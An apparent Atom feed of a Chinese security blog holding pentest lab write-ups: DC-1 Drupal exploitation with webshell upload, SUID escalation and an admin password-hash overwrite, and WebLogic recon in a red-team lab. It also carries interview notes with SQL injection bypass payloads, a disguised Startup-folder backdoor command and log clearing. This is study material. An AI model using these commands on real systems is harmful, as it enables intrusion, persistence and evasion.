<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-07-12T06:02:32.000Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC系列靶机</title>
    <link href="https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/"/>
    <id>https://j3f5.github.io/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</id>
    <published>2023-07-12T06:02:32.000Z</published>
    <updated>2023-07-12T06:02:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dc1"><a class="markdownIt-Anchor" href="#dc1"></a> DC1</h1><p>扫描网段：发现主机10.131.210.98</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140435902.png" alt="image-20230712140435902" /></p><p>使用nmap扫一下：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140545277.png" alt="image-20230712140545277" /></p><p>看来可以做ssh爆破，看一下web：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712140628372.png" alt="image-20230712140628372" /></p><p>发现是apache2.2.22+drupal7+PHP5.4。扫一下目录，很多403,基本没用，那么就去看msf有什么可以利用的：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154719821.png" alt="image-20230712154719821" /></p><p>使用较新的，而且不用登录的，即第二个，设置好之后打进去，OK，<a href="http://xn--linenum-fw3kw4fpzjcwic18n162b.sh">上传冰蝎马和linenum.sh</a>，读取到flag1：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155004482.png" alt="image-20230712155004482" /></p><p>并且看到这个：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154841290.png" alt="image-20230712154841290" /></p><p>直接suid提权了：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155126132.png" alt="image-20230712155126132" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712155104418.png" alt="image-20230712155104418" /></p><p>之后看到/home/flag4/flag4.txt。纳闷flag3去哪了。于是看到配置文件：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712154940971.png" alt="image-20230712154940971" /></p><p>登录并且查数据：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230712153950829.png" alt="image-20230712153950829" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">|        |                                                         |</span><br><span class="line">| admin  | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line">| Fred   | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br><span class="line">| admin1 | $S$DM59jnj9ztGmOy11bBQngVSuoaX6fVGsOgIXH/fLIMYYyjOjTX0Y |</span><br><span class="line">| admin2 | $S$DQDu/ko157iaafvOhwAPmbjZeMabVTLcu1bGdFbGUFfheKlB7u81 |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>他们有自己的加密方式，自己更新一个密码即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">mysql -h localhost -u dbuser -p</span><br><span class="line">Enter password:R0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DQZsZLqxCbnNCRuvOFCQBC2snsbkjGrH3Xw4nqxxhuYIONkuC4dP&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>登录看到flag3。</p><h1 id="dc2"><a class="markdownIt-Anchor" href="#dc2"></a> DC2</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;dc1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dc1&quot;&gt;&lt;/a&gt; DC1&lt;/h1&gt;
&lt;p&gt;扫描网段：发现主机10.131.210.98&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/DC%E7%B3%BB%E5%88%97%</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计</title>
    <link href="https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-07-10T12:14:58.000Z</published>
    <updated>2023-07-10T12:14:58.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>面试整理</title>
    <link href="https://j3f5.github.io/articles/2023/07/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/"/>
    <id>https://j3f5.github.io/articles/2023/07/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/</id>
    <published>2023-07-10T01:27:17.000Z</published>
    <updated>2023-07-10T01:27:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL</h1><h2 id="过滤逗号的sql注入如何绕过limit"><a class="markdownIt-Anchor" href="#过滤逗号的sql注入如何绕过limit"></a> 过滤逗号的SQL注入如何绕过（limit）</h2><p>使用from或者offset，具体来说</p><ol><li>如果是过滤limit后的逗号，可以使用offset来替换，例如：<code>select * from user where id &gt; 2 limit 2 offset 3</code>，等价于：<code>limit 3, 2</code>，即以下标3为开始，输出两个。</li><li>如果是过滤substr，mid等盲注需要的函数，则可使用from for代替，例如：<code>-1' and substr((select name from user where id = 1 limit 1 offset 0) from 1 for 2)</code>，相当于<code>substr(~, 1, 2)</code></li><li>其他的还可以用<code>like</code>和<code>join</code>代替（也就是不使用mid等函数，直接等于正则）。</li></ol><h1 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h1><p>防御总则：对输入做过滤，对输出做转义</p><h2 id="输出到href的xss如何防御"><a class="markdownIt-Anchor" href="#输出到href的xss如何防御"></a> 输出到href的XSS如何防御</h2><p>输出出现在<strong>a标签的href属性</strong>里面,可以使用<strong>javascript协议</strong>来执行js</p><ol><li>a标签的href属性中一般放的是URL（链接），所以我们可以规定， 这里的输入<strong>必须以http或者https开头</strong>，否则不予以输入。</li><li>再对这里进行<code>htmlspecialchars($str, ENT_QUOTES);</code>函数处理。（注：这个函数是把html特殊字符转为html实体）</li></ol><h1 id="csrf与xss"><a class="markdownIt-Anchor" href="#csrf与xss"></a> CSRF与XSS</h1><h2 id="什么是csrf"><a class="markdownIt-Anchor" href="#什么是csrf"></a> 什么是CSRF</h2><p>csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）。这个操作不是用户真正想要执行的。</p><h2 id="csrf怎么防御"><a class="markdownIt-Anchor" href="#csrf怎么防御"></a> CSRF怎么防御</h2><ol><li>当用户发送重要的请求时输入<strong>验证码</strong></li><li>设置<strong>随机TOKEN</strong> <em>—数据包的唯一值</em><ol><li>如果前后端分离，设置不了token，则设置cookie为samesite属性的</li></ol></li><li><strong>检测referer来源</strong>，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</li><li><strong>限制请求方式只能为post</strong>。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块</li></ol><h2 id="samesite防御csrf的原理"><a class="markdownIt-Anchor" href="#samesite防御csrf的原理"></a> samesite防御CSRF的原理</h2><p>原理：设置了samesite的cookie，在传输cookie的时候，会验证请求来源或地址是否是同域的，如果不同域就不传输cookie，导致伪造的网站无法接收到cookie（窃取）。</p><p>拓展：它一定能防止csrf吗？</p><ol><li>浏览器SameSite默认属性并不能完全防止CSRF攻击，<strong>超链接访问、form表单提交到新页面等攻击方式依然有效</strong></li><li>敏感业务可以设置cookie属性SameSite=Strict，防止来自站外攻击。注：samesite有三个属性。</li></ol><h2 id="json格式的csrf如何防御"><a class="markdownIt-Anchor" href="#json格式的csrf如何防御"></a> json格式的CSRF如何防御</h2><h2 id="csrf与xss的区别"><a class="markdownIt-Anchor" href="#csrf与xss的区别"></a> CSRF与XSS的区别</h2><p>区别一：</p><ul><li>CSRF：是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发<br />起的确认，需要用户先登录网站A，获取 cookie。</li><li>XSS：跨站脚本，不需要登录。</li></ul><p>区别二：（原理的区别）</p><ul><li>CSRF：是利用网站A本身的漏洞，去请求网站A的api。</li><li>XSS：是向网站 A 注入 JS代码，然后执行 JS里的代码，篡改网站A的内容</li></ul><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><h2 id="phpinfo你会关注哪些信息"><a class="markdownIt-Anchor" href="#phpinfo你会关注哪些信息"></a> phpinfo你会关注哪些信息</h2><ol><li><p>绝对路径<code>(_SERVER[“SCRIPT_FILENAME”])</code></p><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/6d50a4d95030412fafc05904c6f6bbad.png" alt="请添加图片描述" /></p></li><li><p>支持程序（中间件），如redis、curl、mysql看是否支持gopher，是否开启fastcgi</p></li><li><p>真实<code>IP_SERVER[“SERVER_ADDR”]</code></p></li><li><p>敏感配置：</p><p><code>allow_url_include</code>：远程文件包含</p><p><code>allow_url_fopen</code>：远程文件读取</p><p><code>disable_functions</code>：表示禁用的函数名</p><p><code>open_basedir</code>：可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径</p><p><code>short_open_tag</code>：允许<code>&lt;??&gt;</code>这种形式，并且<code>&lt;?=</code>等价于<code>&lt;? echo</code></p></li><li><p><code>php.ini</code>配置文件配置：<code>Loaded Configuration File</code></p></li></ol><h2 id="域名相关"><a class="markdownIt-Anchor" href="#域名相关"></a> 域名相关</h2><h3 id="域名泛解析怎么处理"><a class="markdownIt-Anchor" href="#域名泛解析怎么处理"></a> 域名泛解析怎么处理</h3><p>域名泛解析就是利用通配符<code>* </code>（星号）来做次级域名以实现<strong>所有的次级域名均指向同一IP地址</strong>。如果使用Layer爆破域名得到的均会是200成功状态码，而且ttl基本一样。</p><p>判断：ping一个不可能存在的域名，如果成功了，那么就存在域名泛解析</p><p>对抗：采用<strong>IP黑名单</strong>方式。</p><ul><li>首先确定黑名单IP：多次ping随机域名，搜集固定ttl和多次出现的IP，制作黑名单</li><li>使用域名字典扫，过滤固定ttl和IP黑名单。在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</li></ul><h2 id="cdn相关"><a class="markdownIt-Anchor" href="#cdn相关"></a> CDN相关</h2><h3 id="cdn是什么"><a class="markdownIt-Anchor" href="#cdn是什么"></a> CDN是什么</h3><p>CDN是一组不同运行商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源（html、css、js、图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，只有实际产生业务交互的时候，才会与真正的服务器进行交互</p><h3 id="cdn怎么判断"><a class="markdownIt-Anchor" href="#cdn怎么判断"></a> CDN怎么判断</h3><ol><li>多地ping，看是否有多个IP</li><li>查看响应包中是否有cdn字样</li><li>查看nslookup，看有没有多个IP地址</li></ol><h3 id="如何绕过cdn"><a class="markdownIt-Anchor" href="#如何绕过cdn"></a> 如何绕过CDN</h3><ol><li>通过邮件返回的地址解析</li><li>DNS历史查看</li><li>子域名IP查看</li><li>国外访问域名（国外ping）</li><li>文件phpinfo</li></ol><h1 id="渗透流程"><a class="markdownIt-Anchor" href="#渗透流程"></a> 渗透流程</h1><h2 id="给你一个目标如何进行渗透测试"><a class="markdownIt-Anchor" href="#给你一个目标如何进行渗透测试"></a> 给你一个目标，如何进行渗透测试</h2><ol><li>获得更多信息<ol><li>真实IP：看是否使用了CDN</li><li>子域名/旁站/C段，以及相似域名（查看该公司的资产结构，例如whois信息、招聘信息、天眼查）</li><li>是否存在waf</li></ol></li><li>对这些域名站点进行渗透<ol><li>是否使用了框架，并查看是否有历史漏洞</li><li>是否使用了有漏洞的中间件</li><li>是否使用了CMS，并查看是否有历史漏洞</li><li>点功能点，看历史请求，重点观察输入输出窗口、上传窗口，js相应API等。对每个可能的漏洞点进行测试，查看是否存在SQL/XSS/未授权访问等等漏洞</li><li>扫目录，看是否存在后台（弱口令）/敏感文件/备份文件</li></ol></li><li>漏洞利用与权限提升<ol><li>使用数据库提升权限（mysql udf、sqlserver xp_cmdshell等）</li><li>使用Linux/Windows的历史漏洞（烂土豆+令牌劫持、脏牛等等）</li></ol></li><li>清除日志数据+生成报告</li></ol><h2 id="权限维持你了解过吗"><a class="markdownIt-Anchor" href="#权限维持你了解过吗"></a> 权限维持你了解过吗</h2><p><a href="https://github.com/jas502n/sangfor/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.md">参考</a></p><h3 id="web端"><a class="markdownIt-Anchor" href="#web端"></a> Web端</h3><p>使用菜刀、冰蝎、蚁剑、哥斯拉等</p><h3 id="windows端"><a class="markdownIt-Anchor" href="#windows端"></a> Windows端</h3><ol><li><p>添加用户并将之移到管理员用户组（administrator）</p></li><li><p>粘滞键调用cmd.exe（替换sethc）</p></li><li><p>计划任务后门：上传计划任务脚本，添加并隐藏（at）</p></li><li><p>开机启动后门：<code>copy &quot;C:\Windows\Temp\payload.exe&quot; &quot;C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; /y</code></p></li><li><p>服务启动后门：上传后门程序，添加任务。（sc）</p></li><li><p>本地组策略后门（LGP）</p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230712105615163.png" alt="image-20230712105615163" style="zoom:33%;" /></li></ol><h3 id="linux端"><a class="markdownIt-Anchor" href="#linux端"></a> Linux端</h3><ol><li>计划任务，三个：<code>/etc/cron.d</code>，<code>/var/spool/crontab</code>，<code>/etc/crontab</code></li><li>root用户组</li><li>tar文件执行</li><li>启动项</li></ol><h3 id="域"><a class="markdownIt-Anchor" href="#域"></a> 域</h3><ol><li>组策略（GPO）</li></ol><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230712110417931.png" alt="image-20230712110417931" style="zoom:50%;" /><ol start="2"><li>黄金票据</li></ol><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><h4 id="cs"><a class="markdownIt-Anchor" href="#cs"></a> CS</h4><p>与MSF一样，都需要免杀</p><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h4><p>msfvenom 可用于生成正向或反向 shell 的 payload，配合 meterpreter 使用进行渗透测试相当方便，不过在实际使用时，需要进行相应的免杀处理</p><h1 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h1><h2 id="fastjson"><a class="markdownIt-Anchor" href="#fastjson"></a> fastjson</h2><h2 id="python-ssti"><a class="markdownIt-Anchor" href="#python-ssti"></a> python-ssti</h2><h2 id="python-字节码"><a class="markdownIt-Anchor" href="#python-字节码"></a> python-字节码</h2><h1 id="加密与解密"><a class="markdownIt-Anchor" href="#加密与解密"></a> 加密与解密</h1><h2 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h2><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="各个协议层osi-tcpip"><a class="markdownIt-Anchor" href="#各个协议层osi-tcpip"></a> 各个协议层OSI TCP/IP</h2><h2 id="浏览器解析顺序和解码顺序"><a class="markdownIt-Anchor" href="#浏览器解析顺序和解码顺序"></a> 浏览器解析顺序和解码顺序</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sql&quot;&gt;&lt;/a&gt; SQL&lt;/h1&gt;
&lt;h2 id=&quot;过滤逗号的sql注入如何绕过limit&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#过滤逗号的sq</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2023-07-05T03:44:45.000Z</published>
    <updated>2023-07-05T03:44:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><h2 id="应急响应"><a class="markdownIt-Anchor" href="#应急响应"></a> 应急响应：</h2><p><strong>分为几个阶段</strong>：</p><p>保护阶段，分析阶段，复现阶段，修复阶段，建议阶段</p><p><strong>目的</strong>：</p><p>分析出攻击时间，攻击操作，攻击后果，安全修复等并给出合理解决方案。</p><p><strong>一般指向：</strong></p><ol><li><p>攻击者可能拿到了哪些权限，攻击可能发生在哪个部分，从最可能的开始排查</p></li><li><p>可疑文件看文件有没有毒，有没有外部链接</p></li><li><p>结合攻击指搭建平台的漏洞</p></li></ol><h2 id="必备知识点"><a class="markdownIt-Anchor" href="#必备知识点"></a> 必备知识点</h2><ol><li>熟悉常见的 WEB 安全攻击技术</li><li>熟悉相关日志启用及存储查看等</li><li>熟悉日志中记录数据分类及分析等</li></ol><h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h2><ol><li>收集目标服务器各类信息</li><li>部署相关分析软件及平台等</li><li>整理相关安全渗透工具指纹库</li><li>针对异常表现第一时间触发思路，从表现预估入侵面及权限面进行排查</li></ol><h2 id="有明确信息网站被入侵"><a class="markdownIt-Anchor" href="#有明确信息网站被入侵"></a> 有明确信息网站被入侵</h2><p>基于时间 基于操作 基于指纹 基于其他</p><h2 id="无明确信息网站被入侵"><a class="markdownIt-Anchor" href="#无明确信息网站被入侵"></a> 无明确信息网站被入侵</h2><ol><li>WEB 漏洞——检查源码类别及漏洞情况</li><li>中间件漏洞——检查对应版本及漏洞情况</li><li>第三方应用漏洞——检查是否存在漏洞应用</li><li>操作系统层面漏洞——检查是否存在系统漏洞</li><li>其他安全问题(口令，后门等)——检查相关应用口令及后门扫描</li></ol><h2 id="常见分析方法"><a class="markdownIt-Anchor" href="#常见分析方法"></a> 常见分析方法</h2><p><strong>指纹库搜索</strong>，<strong>日志时间分析</strong>，<strong>后门追查分析</strong>，<strong>漏洞检查分析等</strong></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><p>发现虚拟机用的是Inter的，我的是锐龙，没办法唤醒，绝了，暂停</p><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1><p><a href="https://www.onlinedown.net/soft/628964.htm">UserAssistView 1.02</a> <a href="https://www.cnblogs.com/xiaozi/p/12679777.html">10款常见的Webshell检测工具</a> <a href="http://www.pc6.com/softview/SoftView_195167.html">PCHunter64</a> <a href="https://github.com/EricZimmerman/AppCompatCacheParser/releases/">https://github.com/EricZimmerman/AppCompatCacheParser/releases/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本概念&quot;&gt;&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;h2 id=&quot;应急响应&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#应急响应&quot;&gt;&lt;/a&gt; 应急响应：&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红队靶场-2</title>
    <link href="https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/"/>
    <id>https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/</id>
    <published>2023-06-30T06:19:36.000Z</published>
    <updated>2023-06-30T06:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><h2 id="主要练习"><a class="markdownIt-Anchor" href="#主要练习"></a> 主要练习</h2><p>Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。</p><ul><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据/白银票据/Sid History/MOF）</li></ul><h2 id="环境设置"><a class="markdownIt-Anchor" href="#环境设置"></a> 环境设置</h2><p>密码统一为：1qaz@WSX</p><p>内网网段：10.10.10.1/24。这个设置NAT网段，所以NAT为10.10.10.0/24</p><p>DMZ网段：10.131.210.1/24。因为用的另一个笔记本进行攻击，所以，使用桥接模式，这个DMZ段的网址是路由器决定的，需要改。</p><p>测试机地址：10.131.210.104（Windows），10.131.210.172（Linux）</p><p>所以这些虚拟机的“外网”IP为：</p><ul><li><p>DC</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012(64)</li><li>应用：AD域</li></ul></li><li><p>WEB</p><ul><li>IP1：10.10.10.80</li><li>IP2：10.131.210.32</li><li>OS：Windows 2008(64)</li><li>应用：Weblogic 10.3.6   MSSQL 2008</li></ul></li><li><p>扫了一遍发现没有开weblogic，那就开一下，进去之后搜索weblogic即可</p></li><li><p>PC</p><ul><li>IP1：10.10.10.201</li><li>IP2：10.131.210.194</li><li>OS：Windows 7(32)</li></ul></li></ul><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/%E6%8B%93%E6%89%91%E5%9B%BE.jpg" alt="img" /></p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p>扫网段就不扫了，我们知道有一个IP，10.131.210.32，发现端口：80、135、139、445、1433、3389、7001、49152、49153、49154、49155、49157、49158。是windows主机</p><h2 id="域信息"><a class="markdownIt-Anchor" href="#域信息"></a> 域信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   Target_Name: DE1AY</span><br><span class="line">|   NetBIOS_Domain_Name: DE1AY</span><br><span class="line">|   NetBIOS_Computer_Name: WEB</span><br><span class="line">|   DNS_Domain_Name: de1ay.com</span><br><span class="line">|   DNS_Computer_Name: WEB.de1ay.com</span><br><span class="line">|   DNS_Tree_Name: de1ay.com</span><br><span class="line">|   Product_Version: 6.1.7601</span><br></pre></td></tr></table></figure><h2 id="mssql的版本"><a class="markdownIt-Anchor" href="#mssql的版本"></a> MSSQL的版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|   name: Microsoft SQL Server 2008 R2 SP2</span><br><span class="line">|   number: 10.50.4000.00</span><br></pre></td></tr></table></figure><h2 id="weblogic版本"><a class="markdownIt-Anchor" href="#weblogic版本"></a> weblogic版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; </span><br></pre></td></tr></table></figure><h2 id="80端口信息"><a class="markdownIt-Anchor" href="#80端口信息"></a> 80端口信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open  http         Microsoft IIS httpd 7.5</span><br></pre></td></tr></table></figure><p>解析漏洞，没有看见网页（上传地址）没办法利用</p><h2 id="服务器信息"><a class="markdownIt-Anchor" href="#服务器信息"></a> 服务器信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows Server 2008 R2 - 2012 </span><br></pre></td></tr></table></figure><h2 id="其他端口信息"><a class="markdownIt-Anchor" href="#其他端口信息"></a> 其他端口信息</h2><p>135 通过135端口入侵实际上是利用RPC漏洞来攻击计算机的。一般情况下135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）</p><p>139 存在Samba服务，可能存在爆破/未授权访问/远程命令执行漏洞。他是NetBIOS Session Service设备提供的辅助端口，是用于提供Windows文件和打印机共享文件的重要连接方式</p><p>445 smb服务，可能存在ms17_010永恒之蓝漏洞。139和445存在，为ipc和smb的利用提供了条件。</p><h2 id="主机信息使用冰蝎看的"><a class="markdownIt-Anchor" href="#主机信息使用冰蝎看的"></a> 主机信息（使用冰蝎看的）</h2><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>主动防御</p><p>SQL Server</p><h3 id="正在运行"><a class="markdownIt-Anchor" href="#正在运行"></a> 正在运行</h3><p>sqlserver weblogic 360</p><h3 id="systeminfo"><a class="markdownIt-Anchor" href="#systeminfo"></a> systeminfo</h3><p>系统：Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601</p><p>名：WEB</p><p>所以搜集到两个网段：</p><ul><li>10.10.10.80</li><li>10.131.210.32</li></ul><p>补丁：</p><ul><li>KB2999226</li><li>KB958488</li><li>KB976902</li></ul><p>域：<a href="http://de1ay.com">de1ay.com</a></p><h1 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> Weblogic</h1><h2 id="weblogic-scan"><a class="markdownIt-Anchor" href="#weblogic-scan"></a> Weblogic scan</h2><p>这里有两个脚本，一个是原始的，不好用，探测不出来：</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><p>一个是修改过的，这个好用：</p><p><a href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p><p>还有个利用工具：</p><p><a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a></p><p>探测到的信息有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Welcome To WeblogicScan !!</span><br><span class="line">[*]开始检测 weblogic-console</span><br><span class="line">[+]The target Weblogic console address is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/console/login/LoginForm.jsp         </span><br><span class="line">[+]Please try weak password blasting!                                         </span><br><span class="line">[+]Weblogic后台路径存在</span><br><span class="line">[*]开始检测 SSRF</span><br><span class="line">[+]The target Weblogic UDDI module is exposed!</span><br><span class="line">[+]The path is: http://10.131.210.32:7001/uddiexplorer/                       </span><br><span class="line">[+]Please verify the SSRF vulnerability!                                                                            </span><br><span class="line">[+]SSRF 漏洞存在</span><br><span class="line">[*]开始检测 CVE20192725</span><br><span class="line">[-]CVE20192725 未成功检测，请检查网络连接或或目标存在负载中间件</span><br><span class="line">[*]开始检测 CVE20192729</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729</span><br><span 